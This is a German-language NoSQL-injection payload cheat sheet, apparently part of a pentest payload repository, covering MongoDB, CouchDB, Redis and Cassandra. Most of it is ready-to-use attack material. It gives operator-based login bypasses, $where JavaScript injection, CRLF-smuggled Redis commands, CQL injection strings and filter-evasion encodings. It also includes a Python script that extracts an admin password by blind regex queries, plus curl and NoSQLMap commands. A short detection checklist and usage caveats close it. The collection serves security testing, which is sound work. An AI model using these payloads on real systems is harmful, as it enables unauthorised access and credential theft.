# 🍃 Payloads für NoSQL-Injection

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](NoSQL-Injection.tr.md) • [🇬🇷 Ελληνικά](NoSQL-Injection.el.md)

```
███╗   ██╗ ██████╗ ███████╗ ██████╗ ██╗         ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
████╗  ██║██╔═══██╗██╔════╝██╔═══██╗██║         ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██╔██╗ ██║██║   ██║███████╗██║   ██║██║         ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║╚██╗██║██║   ██║╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║ ╚████║╚██████╔╝███████║╚██████╔╝███████╗    ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 MongoDB-Injection

### Authentifizierung umgehen
```javascript
// JSON-Injection
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$nin": []}, "password": {"$nin": []}}

// URL-kodiert
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Häufige Operatoren
```javascript
$eq     // Equal
$ne     // Not equal
$gt     // Greater than
$gte    // Greater than or equal
$lt     // Less than
$lte    // Less than or equal
$in     // In array
$nin    // Not in array
$regex  // Regular expression
$exists // Field exists
$or     // Logical OR
$and    // Logical AND
$where  // JavaScript expression
```

---

## 💉 Grundlegende Payloads

### Injection in URL-Parametern
```
# Authentifizierung umgehen
username[$ne]=admin&password[$ne]=wrongpassword
username[$regex]=^a.*&password[$ne]=wrongpassword
username=admin&password[$ne]=wrongpassword

# Bedingungen, die immer wahr sind
{"$gt": ""}
{"$ne": null}
{"$ne": ""}
{"$exists": true}
```

### Injection im JSON-Anfragetext
```json
// Einfache Umgehung
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Umgehung mit regulärem Ausdruck
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// ODER-Bedingung
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// Größer als
{"username": "admin", "password": {"$gt": ""}}
```

---

## 🔥 Daten auslesen

### Regex-basierte Datenextraktion
```javascript
// Passwort Zeichen für Zeichen auslesen
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
...

// An einer bestimmten Position auslesen
password[$regex]=^.{0}a.*   // First char is 'a'?
password[$regex]=^.{1}b.*   // Second char is 'b'?

// Häufige Zeichen
password[$regex]=^[a-z].*   // Starts with lowercase
password[$regex]=^[A-Z].*   // Starts with uppercase
password[$regex]=^[0-9].*   // Starts with number
```

### Skript zur blinden booleschen Datenextraktion
```python
import requests
import string

url = "http://target/login"
charset = string.ascii_letters + string.digits + "_@!#$%"
password = ""

while True:
    found = False
    for char in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{char}.*"
        }
        r = requests.post(url, data=payload)
        if "Login successful" in r.text:
            password += char
            print(f"Found: {password}")
            found = True
            break
    if not found:
        break

print(f"Password: {password}")
```

---

## 🚀 Fortgeschrittene Payloads

### $where-JavaScript-Injection
```javascript
// Wartezeitbasiert (zeitbasierte Blind-Injection)
{"$where": "sleep(5000)"}
{"username": {"$where": "sleep(5000)"}}

// Daten auslesen
{"$where": "this.password.length == 8"}
{"$where": "this.password[0] == 'a'"}
{"$where": "this.password.match(/^admin/)"}

// Fehlerbasiert
{"$where": "this.constructor.constructor('return this.password')()"}
```

### Array-Injection
```json
// $in-Operator
{"username": {"$in": ["admin", "administrator", "root"]}}

// $nin-Operator
{"username": {"$nin": ["guest", "anonymous"]}}
```

### Operator-Injection
```
# Feld als Operator interpretieren lassen
username=admin&password[$ne]=wrongpassword

# Verschachtelter Operator
username[$eq]=admin&password[$regex]=^p

# Mehrere Operatoren
username[$gt]=&username[$lt]=z&password[$ne]=
```

---

## 🍃 CouchDB-Injection

### Grundlegende Payloads
```javascript
// Authentifizierung umgehen
{"selector": {"username": {"$ne": ""}, "password": {"$ne": ""}}}

// Regulärer Ausdruck
{"selector": {"username": {"$regex": ".*"}}}

// Größer als
{"selector": {"password": {"$gt": null}}}
```

### View-Injection
```javascript
// Injection in Mango-Abfragen
{"selector": {"_id": {"$gt": null}}}

// Alle Dokumente abrufen
{"selector": {"_id": {"$regex": ".*"}}}
```

---

## 🔴 Redis-Injection

### Grundlegende Befehle
```redis
# Schlüssel erfassen
KEYS *
SCAN 0

# Daten auslesen
GET key_name
HGETALL hash_name

# Daten setzen
SET key value
HSET hash field value
```

### Command Injection über die Anwendung
```
# Falls Benutzereingaben in Redis-Befehle gelangen
username=admin\r\nKEYS *\r\n
username=admin%0d%0aKEYS *%0d%0a
```

---

## 📊 Cassandra-Injection

### CQL-Injection
```sql
-- Basic injection
' OR '1'='1
' OR ''='

-- ALLOW FILTERING bypass
SELECT * FROM users WHERE username='admin' ALLOW FILTERING

-- Comment injection
admin'--
admin'/*
```

---

## 🛡️ Umgehungstechniken

### URL-Kodierung
```
$ne     →  %24ne
$gt     →  %24gt
$regex  →  %24regex
$where  →  %24where
```

### Umgehung mit Unicode
```
$ne     →  \u0024ne
$gt     →  \u0024gt
```

### Varianten der Array-Syntax
```
# Standard
password[$ne]=

# Alternative
password[0][$ne]=
password[][$ne]=
```

### Content-Type verändern
```
# Von Formulardaten zu JSON wechseln
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

---

## 📝 Einfügepositionen

```
POST /login
- Parameter im Anfragetext (JSON/Formular)
- Parameter in der Query-Zeichenfolge

GET /users?id=
- Query-Parameter

Header:
- Authorization
- Cookie-Werte

API-Endpunkte:
- GraphQL mit MongoDB-Backend
- REST-API-Filter
```

---

## 🔍 Checkliste zur Erkennung

```markdown
□ Operator $ne prüfen: {"field": {"$ne": ""}}
□ Operator $gt prüfen: {"field": {"$gt": ""}}
□ $regex prüfen: {"field": {"$regex": ".*"}}
□ $where prüfen: {"$where": "1==1"}
□ URL-Array-Syntax prüfen: field[$ne]=
□ JSON-Operatoren prüfen
□ Auf unterschiedliche Antwortzeiten prüfen
□ Auf unterschiedliche Antwortlängen prüfen
□ Mit unterschiedlichen Content-Types prüfen
```

---

## 🔗 Werkzeuge

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap.git
python nosqlmap.py

# Scanner für MongoDB-Injection
nuclei -t nosql-injection.yaml -u http://target

# Manuelle Prüfung mit curl
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

---

## 🔗 Verwandte Payloads

- [SQLi-Payloads](./SQLi.de.md)
- [GraphQL-Injection](./GraphQL-Injection.de.md)

---

**Zurück zur Payload-Sammlung:** 💉 Payload-Sammlung (im Original verlinkt; `Payloads/README.md` fehlt)

---

---

## Hinweise zur deutschen Ausgabe

> **Backend und Kontext:** MongoDB-, CouchDB-, Redis- und Cassandra-Beispiele sind nicht untereinander austauschbar. Operator-Injection setzt voraus, dass Eingaben als Abfragestruktur beziehungsweise unsicherer Befehl verarbeitet werden. `$where` und andere serverseitige JavaScript-Funktionen können deaktiviert oder eingeschränkt sein; die JavaScript-Laufzeit stellt nicht sämtliche Node.js-APIs bereit. [MongoDB: serverseitiges JavaScript](https://www.mongodb.com/docs/manual/core/server-side-javascript/).

> **Auswertung:** Antwortlänge, Zeitunterschied und ein einzelner erfolgreicher Vergleich sind Untersuchungshinweise, keine vollständigen Nachweise. Die Extraktionsskripte benötigen das erwartete Antwortverhalten, passende Daten und eine funktionierende Verbindung; sie sind keine universellen Scanner. Form-Array-Syntax setzt die entsprechende Verarbeitung der Anwendung voraus. Alle Operatoren, JSON-/URL-Werte, Strings und Skripte bleiben unverändert; kein Beispiel wurde ausgeführt.
